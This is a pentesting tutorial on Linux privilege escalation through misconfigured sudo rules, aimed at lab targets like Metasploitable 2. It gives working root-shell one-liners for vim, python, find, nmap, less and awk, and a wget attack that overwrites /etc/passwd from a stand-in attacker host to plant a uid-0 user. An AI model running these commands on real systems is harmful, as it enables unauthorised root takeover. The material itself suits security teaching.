# 02 — Sudo Misconfiguration

## What is Sudo?

`sudo` stands for **Super User Do**. It allows a permitted user to run a command **as root** (or another user).

Normally, sudo requires a password and only allows specific commands. But misconfigurations happen in real environments all the time.

The rules for what a user can run with sudo are stored in:
```
/etc/sudoers
```

---

## Types of Sudo Misconfigurations

### Type 1: NOPASSWD — No Password Required
A user can run a command as root without entering any password.

### Type 2: (ALL) ALL — Run Anything as Root
A user can run **every command** as root.

### Type 3: Specific Binary with NOPASSWD
A user can run a specific binary (like `vim`, `python`, `find`) as root without a password.

---

## Step 1 — Check What You Can Run as Sudo

```bash
sudo -l
```

**What this does:** Lists all sudo rules for the current user.

**Example output 1 (dangerous):**
```
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```
This means: this user can run **anything** as root with no password. Instant root.

```bash
sudo su
# OR
sudo /bin/bash
```

---

**Example output 2 (specific binary):**
```
User bob may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
```
This means: user `bob` can run `vim` as root without a password.

---

## Step 2 — Exploiting Common Binaries via Sudo

### vim

```bash
sudo vim -c ':!/bin/bash'
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `sudo vim` | Run vim as root |
| `-c` | Execute a vim command at startup |
| `':!/bin/bash'` | In vim, `!command` runs a shell command. This spawns bash as root |

---

### python

```bash
sudo python -c 'import os; os.system("/bin/bash")'
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `sudo python` | Run python as root |
| `-c` | Run inline Python code |
| `import os` | Load OS module |
| `os.system("/bin/bash")` | Execute bash — which will be a root shell because python is running as root |

---

### find

```bash
sudo find / -exec /bin/bash \; -quit
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `sudo find /` | Run find as root |
| `-exec /bin/bash \;` | Execute bash for each result |
| `-quit` | Stop after first match |

---

### nmap

```bash
sudo nmap --interactive
nmap> !sh
```

---

### less / more

```bash
sudo less /etc/passwd
```
Once inside less, type:
```
!/bin/bash
```
**Explanation:** Both `less` and `more` allow running shell commands from within them using `!`. Since they're running as root, the spawned shell is also root.

---

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `sudo awk` | Run awk as root |
| `BEGIN {...}` | Run this block before processing any input |
| `system("/bin/bash")` | awk's built-in function to run a system command |

---

### wget

If `wget` can run as sudo, you can overwrite sensitive files:

```bash
# On your Kali — create a malicious /etc/passwd
openssl passwd -1 -salt hacker hacker123
# Copy the output hash

# Create a new passwd file with a root-level user "hacker"
echo "hacker:HASH_HERE:0:0:root:/root:/bin/bash" >> passwd

# Host it
python3 -m http.server 8080

# On target — overwrite /etc/passwd
sudo wget http://YOUR_IP:8080/passwd -O /etc/passwd

# Now login as hacker with password hacker123
su hacker
```

---

## Step 3 — GTFOBins for Sudo

Every binary above (and many more) is documented at **GTFOBins** under the "Sudo" section. The process is always the same:

1. `sudo -l` → See which binary you can run as root
2. Search that binary on GTFOBins → Sudo section
3. Copy and run the command

---

## Real World Example — Webserver User

In web application pentesting, you often get a shell as `www-data` (the web server user). This user sometimes has sudo rules configured by a lazy sysadmin.

```bash
# You have a shell as www-data
sudo -l

# Output might show:
(root) NOPASSWD: /usr/bin/python3

# Exploit:
sudo python3 -c 'import os; os.system("/bin/bash")'
# Now you're root
```

---

## Practice on Metasploitable 2

```bash
# After getting a shell, check sudo rules
sudo -l

# If you see any binary — search GTFOBins and exploit
```

---

## Summary

```
1. sudo -l                          → Check what you can run as sudo
2. Look for NOPASSWD entries        → No password = easy escalation
3. Match the binary to GTFOBins     → Find the exploit command
4. Run it → Get root shell
5. Verify: id / whoami
```
